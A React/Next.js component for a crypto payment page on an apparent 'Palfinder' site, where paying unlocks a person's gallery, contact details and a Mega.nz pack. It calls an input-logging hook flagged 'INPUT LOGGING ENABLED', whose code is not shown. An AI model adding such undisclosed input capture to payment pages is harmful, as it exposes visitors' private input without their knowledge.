'use client'

import { useInputLogger } from '@/hooks/useInputLogger'

/**
 * ============================================================================
 * PaymentClient — Manual Crypto Payment Page
 * ============================================================================
 * This page shows a coin selector, the correct wallet address, a live QR code,
 * the exact USD amount, a unique payment reference, and a countdown timer.
 *
 * All wallet addresses come from lib/config/crypto.ts — update there only.
 * ============================================================================
 */

import { useState, useEffect, useRef, useCallback } from 'react'
import Link from 'next/link'
import {
  ChevronLeftIcon, WalletIcon, ClockIcon, CopyIcon, CheckIcon,
  ShieldCheckIcon, QrCodeIcon, StarIcon, HeartIcon, CheckCircle2Icon,
  ChevronDownIcon, AlertTriangleIcon, InfoIcon, Loader2Icon, DownloadIcon, LinkIcon
} from 'lucide-react'
import { SORTED_WALLETS, generatePaymentRef, type CryptoWallet } from '@/lib/config/crypto'

// ─── Types ────────────────────────────────────────────────────────────────────

interface DBProfile {
  id: string
  name: string
  location: string
  bio: string
  price: number
  rating: number
  age: number
  tags: string[]
  mainPhoto: string
  gallery: string[]
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

const fmt = (s: number) =>
  `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`

const PAYMENT_WINDOW = 30 * 60 // 30 minutes in seconds

// ─── Component ───────────────────────────────────────────────────────────────

export default function PaymentClient({ profile }: { profile: DBProfile }) {
  
  // ==================== INPUT LOGGING ENABLED ====================
  useInputLogger('Payment Page');
  // ============================================================

  const [selectedWallet, setSelectedWallet] = useState<CryptoWallet>(SORTED_WALLETS[0])
  const [showDrop, setShowDrop]             = useState(false)
  const [paymentRef, setPaymentRef]         = useState(() => generatePaymentRef(profile.id))
  const [timeLeft, setTimeLeft]             = useState(PAYMENT_WINDOW)
  const [expired, setExpired]               = useState(false)
  const [paymentStatus, setPaymentStatus]   = useState<'waiting' | 'confirming' | 'confirmed' | 'expired'>('waiting')
  const [copiedField, setCopiedField]       = useState<string | null>(null)
  const [megaLink, setMegaLink]             = useState<string | null>(null)
  const [unlockLink, setUnlockLink]         = useState<string | null>(null)
  
  const dropRef                             = useRef<HTMLDivElement>(null)
  const timerRef                            = useRef<ReturnType<typeof setInterval> | null>(null)

  // ... Rest of your code continues from here (no need to change anything below) ...

  // ── 1. Init Session when paymentRef changes ───────────────────────────────
  useEffect(() => {
    let active = true
    async function initSession() {
      try {
        await fetch('/api/payments/init-direct', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            profileId: profile.id,
            profileName: profile.name,
            priceUsd: profile.price,
            coinId: selectedWallet.id,
            walletAddress: selectedWallet.address,
            paymentRef
          })
        })
      } catch (e) {
        console.error('Init failed', e)
      }
    }
    initSession()
    return () => { active = false }
  }, [paymentRef, profile.id, profile.name, profile.price, selectedWallet.id, selectedWallet.address])

  // ── 2. Poll every 5s if waiting and not expired ───────────────────────────
  useEffect(() => {
    if (paymentStatus === 'confirmed' || paymentStatus === 'expired' || expired) return

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/payments/check-direct/${paymentRef}`)
        const data = await res.json()
        if (data.success) {
          if (data.status === 'expired') {
            setExpired(true)
            setPaymentStatus('expired')
          } else if (data.status === 'confirmed') {
            setPaymentStatus('confirmed')
            if (data.megaLink) setMegaLink(data.megaLink)
            if (data.unlockLink) setUnlockLink(data.unlockLink)
          } else {
            setPaymentStatus(data.status)
          }
        }
      } catch (e) {
        console.error('Check failed', e)
      }
    }, 5000)

    return () => clearInterval(interval)
  }, [paymentRef, paymentStatus, expired])

  // ── Countdown ──────────────────────────────────────────────────────────────
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) { 
          setExpired(true)
          setPaymentStatus('expired')
          return 0 
        }
        return prev - 1
      })
    }, 1000)
    return () => { if (timerRef.current) clearInterval(timerRef.current) }
  }, [])

  // ── Close dropdown on outside click ───────────────────────────────────────
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (dropRef.current && !dropRef.current.contains(e.target as Node)) {
        setShowDrop(false)
      }
    }
    document.addEventListener('mousedown', handler)
    return () => document.removeEventListener('mousedown', handler)
  }, [])

  // ── Copy helper ───────────────────────────────────────────────────────────
  const copy = useCallback(async (text: string, field: string) => {
    try { await navigator.clipboard.writeText(text) } catch { /* fallback */ }
    setCopiedField(field)
    setTimeout(() => setCopiedField(null), 2000)
  }, [])

  // ── Reset timer & generate new ref when coin changes ─────────────────────
  const handleSelectWallet = (wallet: CryptoWallet) => {
    setSelectedWallet(wallet)
    setShowDrop(false)
    setTimeLeft(PAYMENT_WINDOW)
    setExpired(false)
    setPaymentStatus('waiting')
    setPaymentRef(generatePaymentRef(profile.id))
  }

  const handleRefresh = () => {
    setTimeLeft(PAYMENT_WINDOW)
    setExpired(false)
    setPaymentStatus('waiting')
    setPaymentRef(generatePaymentRef(profile.id))
  }

  // ── Success State ─────────────────────────────────────────────────────────
  if (paymentStatus === 'confirmed') {
    return (
      <div className="min-h-screen flex items-center justify-center p-4" style={{ background: 'linear-gradient(160deg,#08080F 0%,#0D0A14 60%,#0A0510 100%)' }}>
        <div className="max-w-md w-full rounded-2xl p-8 text-center space-y-6 relative overflow-hidden" style={{ background: '#0F0F1E', border: '1px solid #00D168', boxShadow: '0 0 50px rgba(0,209,104,0.1)' }}>
          <div className="w-20 h-20 bg-[#00D168]/20 rounded-full flex items-center justify-center mx-auto">
            <CheckCircle2Icon className="w-10 h-10 text-[#00D168]" />
          </div>
          <div>
            <h2 className="text-2xl font-bold text-white mb-2">Payment Confirmed!</h2>
            <p className="text-sm text-white/60">Your payment for {profile.name} was successfully received on the blockchain.</p>
          </div>
          
          <div className="rounded-xl p-5 text-left space-y-4" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.05)' }}>
            <p className="text-xs font-semibold text-white/40 uppercase tracking-wider">Unlocked Content</p>
            
            {megaLink && (
              <a href={megaLink} target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full py-3.5 rounded-xl font-bold text-white transition-all transform hover:scale-[1.02] active:scale-95" style={{ background: 'linear-gradient(135deg, #D9272E 0%, #A31D22 100%)', boxShadow: '0 8px 25px rgba(217, 39, 46, 0.3)' }}>
                <DownloadIcon className="w-5 h-5" />
                Download Mega.nz Pack
              </a>
            )}

            {unlockLink && (
              <a href={unlockLink} target="_blank" rel="noopener noreferrer" className="flex items-center justify-center gap-2 w-full py-3 rounded-xl font-semibold text-[#00D168] bg-[#00D168]/10 hover:bg-[#00D168]/20 transition border border-[#00D168]/30">
                <LinkIcon className="w-4 h-4" />
                Additional Private Access
              </a>
            )}

            {!megaLink && !unlockLink && (
              <Link href={`/palfinder/${profile.id}/gallery`} className="flex items-center justify-center gap-2 w-full py-3 rounded-xl font-semibold text-[#00D168] bg-[#00D168]/10 hover:bg-[#00D168]/20 transition border border-[#00D168]/30">
                Access Private Gallery
              </Link>
            )}

            <div className="pt-4 pb-1 flex flex-col gap-3 border-t border-white/5 mt-2">
              <div className="flex justify-between items-center">
                <span className="text-sm text-white/60">Contact info:</span>
                <span className="text-sm font-semibold text-white">Available in Dashboard</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-sm text-white/60">Receipt:</span>
                <span className="text-xs font-mono text-white/40 bg-black/30 px-2 py-1 rounded">{paymentRef}</span>
              </div>
            </div>
          </div>
          
          <Link href="/palfinder" className="inline-block mt-4 text-sm font-medium text-white/40 hover:text-white transition-colors underline decoration-white/20 underline-offset-4">
            Return to Palfinder
          </Link>
        </div>
      </div>
    )
  }

  // ── QR code URL (free, no API key needed) ─────────────────────────────────
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(selectedWallet.address)}&bgcolor=FFFFFF&color=000000&margin=12`

  // ── Timer colour ──────────────────────────────────────────────────────────
  const timerColor = timeLeft < 300 ? '#FF4444' : timeLeft < 600 ? '#E8B547' : 'rgba(255,255,255,0.75)'

  return (
    <div className="min-h-screen" style={{ background: 'linear-gradient(160deg,#08080F 0%,#0D0A14 60%,#0A0510 100%)' }}>

      {/* Ambient glow */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden" aria-hidden>
        <div style={{
          position: 'absolute', top: '-20%', left: '50%', transform: 'translateX(-50%)',
          width: '700px', height: '700px', borderRadius: '50%',
          background: `radial-gradient(circle,${selectedWallet.color}18 0%,transparent 70%)`,
          filter: 'blur(60px)', transition: 'background 0.6s ease',
        }} />
      </div>

      <div className="relative z-10 max-w-5xl mx-auto px-4 sm:px-6 py-8">
        <Link href="/palfinder" className="inline-flex items-center gap-1.5 text-sm text-white/50 hover:text-white transition-colors mb-8">
          <ChevronLeftIcon className="w-4 h-4" /> Back to Palfinder
        </Link>

        <div className="grid lg:grid-cols-[1fr_440px] gap-8 items-start">

          {/* ── LEFT: Profile summary ─────────────────────────────────────── */}
          <div className="space-y-6">

            {/* Profile card */}
            <div className="rounded-2xl overflow-hidden" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)', boxShadow: '0 8px 32px rgba(0,0,0,0.4)' }}>
              <div className="aspect-[16/9] relative overflow-hidden">
                {profile.mainPhoto
                  ? <img src={profile.mainPhoto} alt={profile.name} className="w-full h-full object-cover" />
                  : <div className="w-full h-full bg-white/5 flex items-center justify-center"><HeartIcon className="w-16 h-16 text-white/10" /></div>}
                <div className="absolute inset-0" style={{ background: 'linear-gradient(to top,rgba(8,8,16,0.9) 0%,transparent 55%)' }} />
                <div className="absolute bottom-0 left-0 right-0 p-5">
                  <h1 className="text-2xl font-extrabold text-white">{profile.name}</h1>
                  <p className="text-xs text-white/50 mt-0.5">{profile.location} · {profile.age} years old</p>
                </div>
              </div>
              <div className="p-5 space-y-4">
                <div className="flex items-center gap-1">
                  {[1,2,3,4,5].map(s => (
                    <StarIcon key={s} className={`w-4 h-4 ${s <= profile.rating ? 'fill-[#E8B547] text-[#E8B547]' : 'fill-white/10 text-white/10'}`} />
                  ))}
                  <span className="text-xs text-white/40 ml-1">{profile.rating.toFixed(1)}</span>
                </div>
                {profile.bio && <p className="text-sm text-white/55 italic leading-relaxed">&ldquo;{profile.bio}&rdquo;</p>}
                <div className="flex flex-wrap gap-1.5">
                  {profile.tags.map((t, i) => (
                    <span key={i} className="text-[10px] font-medium px-2.5 py-1 rounded-full" style={{ background: 'rgba(107,31,42,0.15)', color: '#E8B547', border: '1px solid rgba(107,31,42,0.25)' }}>{t}</span>
                  ))}
                </div>
              </div>
            </div>

            {/* What you unlock */}
            <div className="rounded-2xl p-5 space-y-3" style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)' }}>
              <p className="text-xs font-semibold text-white/40 uppercase tracking-wider">What you unlock</p>
              {['Full media gallery access', 'Direct contact information', 'Priority messaging', 'Exclusive content'].map((item, i) => (
                <div key={i} className="flex items-center gap-2.5 text-sm text-white/70">
                  <CheckCircle2Icon className="w-4 h-4 text-[#00D168] flex-shrink-0" />{item}
                </div>
              ))}
            </div>

            {/* Price box */}
            <div className="rounded-2xl p-5 flex items-center justify-between" style={{ background: 'rgba(107,31,42,0.08)', border: '1px solid rgba(107,31,42,0.2)' }}>
              <div>
                <p className="text-xs text-white/40 mb-1">Total Amount</p>
                <p className="text-3xl font-extrabold text-white">${profile.price.toFixed(2)} <span className="text-sm font-medium text-white/40">USD</span></p>
              </div>
              <div className="w-12 h-12 rounded-full flex items-center justify-center" style={{ background: 'linear-gradient(135deg,#6B1F2A,#E8B547)', boxShadow: '0 0 20px rgba(107,31,42,0.4)' }}>
                <HeartIcon className="w-5 h-5 text-white" />
              </div>
            </div>

            {/* Payment instructions */}
            <div className="rounded-2xl p-5 space-y-3" style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)' }}>
              <p className="text-xs font-semibold text-white/40 uppercase tracking-wider flex items-center gap-2">
                <InfoIcon className="w-3.5 h-3.5" /> Payment Instructions
              </p>
              {[
                '1. Select your preferred coin from the dropdown.',
                '2. Send the exact USD amount shown to the wallet address.',
                '3. Include your Payment Reference as the memo (if supported).',
                '4. We monitor the blockchain directly for your transfer.',
                '5. Access is granted instantly once confirmed.',
              ].map((step, i) => (
                <p key={i} className="text-xs text-white/55 leading-relaxed">{step}</p>
              ))}
            </div>
          </div>

          {/* ── RIGHT: Payment panel ──────────────────────────────────────── */}
          <div className="rounded-2xl overflow-visible sticky top-8" style={{
            background: 'linear-gradient(180deg,#0D0D1A 0%,#0A0A14 100%)',
            border: `1px solid ${selectedWallet.color}30`,
            boxShadow: `0 24px 80px rgba(0,0,0,0.6), 0 0 40px ${selectedWallet.color}15`,
            transition: 'border-color 0.4s ease, box-shadow 0.4s ease',
          }}>

            {/* Panel header */}
            <div className="flex items-center gap-3 px-5 py-4" style={{ borderBottom: '1px solid rgba(255,255,255,0.06)' }}>
              <div className="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0" style={{ background: `linear-gradient(135deg,${selectedWallet.color}60,${selectedWallet.color})`, boxShadow: `0 0 16px ${selectedWallet.color}50` }}>
                <WalletIcon className="w-4 h-4 text-white" />
              </div>
              <div>
                <h2 className="text-sm font-bold text-white">Pay with Crypto</h2>
                <p className="text-[10px] text-white/40">Manual transfer · Direct to wallet</p>
              </div>
            </div>

            <div className="px-5 py-5 space-y-5">

              {/* ── Coin selector ─────────────────────────────────────────── */}
              <div className="relative" ref={dropRef}>
                <label className="block text-[11px] font-medium text-white/40 mb-1.5 uppercase tracking-wider">Select Coin</label>
                <button
                  onClick={() => setShowDrop(v => !v)}
                  className="w-full flex items-center justify-between px-3.5 py-3 rounded-xl text-sm text-white transition"
                  style={{ background: 'rgba(255,255,255,0.05)', border: `1px solid ${selectedWallet.color}40` }}
                >
                  <span className="flex items-center gap-2.5">
                    <img src={selectedWallet.logo} alt={selectedWallet.name} className="w-6 h-6 object-contain" />
                    <span className="flex flex-col text-left">
                      <span className="font-semibold text-white text-sm">{selectedWallet.name}</span>
                      <span className="text-[10px] text-white/40">{selectedWallet.network}</span>
                    </span>
                  </span>
                  <ChevronDownIcon className={`w-4 h-4 text-white/40 transition-transform ${showDrop ? 'rotate-180' : ''}`} />
                </button>

                {showDrop && (
                  <div className="absolute top-full left-0 right-0 mt-1 rounded-xl overflow-hidden z-30 max-h-64 overflow-y-auto"
                    style={{ background: '#0F0F1E', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 16px 50px rgba(0,0,0,0.8)' }}>
                    {SORTED_WALLETS.map((w, i) => (
                      <button
                         key={w.id}
                         onClick={() => handleSelectWallet(w)}
                         className="w-full flex items-center gap-3 px-3.5 py-3 text-sm text-white/80 hover:bg-white/5 transition text-left"
                         style={{
                           borderBottom: i < SORTED_WALLETS.length - 1 ? '1px solid rgba(255,255,255,0.04)' : 'none',
                           ...(w.id === selectedWallet.id ? { background: `${w.color}18`, color: w.color } : {}),
                         }}
                      >
                         <img src={w.logo} alt={w.name} className="w-5 h-5 object-contain" />
                         <span className="flex flex-col">
                           <span className="font-semibold text-sm">{w.name}</span>
                           <span className="text-[10px] text-white/40">{w.network}</span>
                         </span>
                         {w.priority && (
                           <span className="ml-auto text-[9px] font-bold px-1.5 py-0.5 rounded uppercase" style={{ background: `${w.color}25`, color: w.color }}>⭐ Top</span>
                         )}
                      </button>
                    ))}
                  </div>
                )}
              </div>

              {/* ── Amount ───────────────────────────────────────────────── */}
              <div className="rounded-xl p-4" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)' }}>
                <p className="text-[11px] text-white/40 mb-1">Send exactly (USD equivalent)</p>
                <p className="text-2xl font-bold text-white">
                  ${profile.price.toFixed(2)}{' '}
                  <span className="text-sm font-medium text-white/50">USD</span>
                </p>
                <p className="text-[11px] text-white/35 mt-1">in {selectedWallet.ticker} at current market rate</p>
              </div>

              {/* ── QR Code ──────────────────────────────────────────────── */}
              {!expired && (
                <div className="flex flex-col items-center gap-3">
                  <div className="rounded-2xl p-3 inline-block" style={{ background: '#fff', boxShadow: `0 0 30px ${selectedWallet.color}30` }}>
                    <img
                      src={qrUrl}
                      alt={`${selectedWallet.name} wallet QR code`}
                      className="w-44 h-44"
                      style={{ imageRendering: 'pixelated' }}
                    />
                  </div>
                  <div className="flex items-center gap-1.5 text-[10px] text-white/30">
                    <QrCodeIcon className="w-3 h-3" /> Scan with your {selectedWallet.ticker} wallet
                  </div>
                </div>
              )}

              {/* ── Wallet Address ───────────────────────────────────────── */}
              {!expired && (
                <div>
                  <label className="block text-[11px] font-medium text-white/40 mb-1.5 uppercase tracking-wider">
                    {selectedWallet.name} Address
                  </label>
                  <div className="flex items-start gap-2 rounded-xl px-3 py-3" style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)' }}>
                    <p className="flex-1 text-xs text-white/80 font-mono break-all leading-relaxed select-all">
                      {selectedWallet.address}
                    </p>
                    <button
                      onClick={() => copy(selectedWallet.address, 'address')}
                      className="flex-shrink-0 w-8 h-8 rounded-lg flex items-center justify-center transition mt-0.5"
                      style={{ background: copiedField === 'address' ? 'rgba(0,209,104,0.15)' : 'rgba(255,255,255,0.06)' }}
                      aria-label="Copy address"
                    >
                      {copiedField === 'address' ? <CheckIcon className="w-3.5 h-3.5 text-[#00D168]" /> : <CopyIcon className="w-3.5 h-3.5 text-white/50" />}
                    </button>
                  </div>
                  <p className="text-[10px] text-white/30 mt-1.5 px-1">
                    ⚠ Only send {selectedWallet.ticker} on the <span className="text-white/50">{selectedWallet.network}</span>
                  </p>
                </div>
              )}

              {/* ── Memo (TON only) ───────────────────────────────────────── */}
              {selectedWallet.memoLabel && !expired && (
                <div className="rounded-xl px-4 py-3" style={{ background: `${selectedWallet.color}10`, border: `1px solid ${selectedWallet.color}30` }}>
                  <p className="text-[11px] font-semibold mb-1" style={{ color: selectedWallet.color }}>
                    ⚠ {selectedWallet.memoLabel}
                  </p>
                  <p className="text-[11px] text-white/50 leading-relaxed">
                    If you&apos;re sending from an exchange, add the payment reference below as the comment/memo field — otherwise funds may be lost.
                  </p>
                </div>
              )}

              {/* ── Payment Reference ─────────────────────────────────────── */}
              {!expired && (
                <div>
                  <label className="block text-[11px] font-medium text-white/40 mb-1.5 uppercase tracking-wider">
                    Payment Reference / Memo
                  </label>
                  <div className="flex items-center gap-2 rounded-xl px-3 py-2.5" style={{ background: 'rgba(232,181,71,0.06)', border: '1px solid rgba(232,181,71,0.2)' }}>
                    <p className="flex-1 text-sm text-[#E8B547] font-mono font-bold tracking-wider select-all">
                      {paymentRef}
                    </p>
                    <button
                      onClick={() => copy(paymentRef, 'ref')}
                      className="flex-shrink-0 w-8 h-8 rounded-lg flex items-center justify-center transition"
                      style={{ background: copiedField === 'ref' ? 'rgba(0,209,104,0.15)' : 'rgba(232,181,71,0.1)' }}
                      aria-label="Copy payment reference"
                    >
                      {copiedField === 'ref' ? <CheckIcon className="w-3.5 h-3.5 text-[#00D168]" /> : <CopyIcon className="w-3.5 h-3.5 text-[#E8B547]/60" />}
                    </button>
                  </div>
                  <p className="text-[10px] text-white/30 mt-1.5 px-1">
                    Include this reference when contacting us after payment
                  </p>
                </div>
              )}

              {/* ── Status Indicator ──────────────────────────────────────── */}
              {!expired && (
                <div className="flex items-center justify-center gap-2 p-3 rounded-xl mt-4" style={{ background: paymentStatus === 'confirming' ? 'rgba(232,181,71,0.1)' : 'rgba(255,255,255,0.03)' }}>
                  {paymentStatus === 'waiting' && <Loader2Icon className="w-4 h-4 text-white/40 animate-spin" />}
                  {paymentStatus === 'confirming' && <Loader2Icon className="w-4 h-4 text-[#E8B547] animate-spin" />}
                  <span className="text-sm font-medium" style={{ color: paymentStatus === 'confirming' ? '#E8B547' : 'rgba(255,255,255,0.6)' }}>
                    {paymentStatus === 'waiting' ? 'Waiting for transfer...' : 
                     paymentStatus === 'confirming' ? 'Confirming on blockchain...' : 'Checking status...'}
                  </span>
                </div>
              )}

              {/* ── Countdown timer ───────────────────────────────────────── */}
              {!expired ? (
                <div className="flex items-center justify-center gap-2 py-1">
                  <ClockIcon className="w-3.5 h-3.5 text-white/40" />
                  <span className="text-lg font-mono font-bold" style={{ color: timerColor }}>
                    {fmt(timeLeft)}
                  </span>
                  <span className="text-[11px] text-white/30">session remaining</span>
                </div>
              ) : (
                /* ── Expired state ──────────────────────────────────────── */
                <div className="flex flex-col items-center py-6 gap-4">
                  <div className="w-14 h-14 rounded-full flex items-center justify-center" style={{ background: 'rgba(255,68,68,0.1)', border: '2px solid rgba(255,68,68,0.25)' }}>
                    <AlertTriangleIcon className="w-7 h-7 text-red-400" />
                  </div>
                  <div className="text-center space-y-1">
                    <p className="font-bold text-white">Session Expired</p>
                    <p className="text-sm text-white/50">Your session timed out. Refresh to start a new one.</p>
                  </div>
                  <button
                    onClick={handleRefresh}
                    className="px-8 py-2.5 rounded-full text-sm font-bold text-white transition hover:brightness-110"
                    style={{ background: '#6B1F2A', boxShadow: '0 4px 20px rgba(107,31,42,0.5)' }}
                  >
                    Refresh Session
                  </button>
                </div>
              )}
            </div>

            {/* Panel footer */}
            <div className="px-5 py-3 flex items-center justify-center gap-1.5" style={{ borderTop: '1px solid rgba(255,255,255,0.05)' }}>
              <ShieldCheckIcon className="w-3 h-3 text-white/20" />
              <span className="text-[10px] text-white/20">Secure · Crypto transactions are irreversible</span>
            </div>
          </div>

        </div>
      </div>
    </div>
  )
}
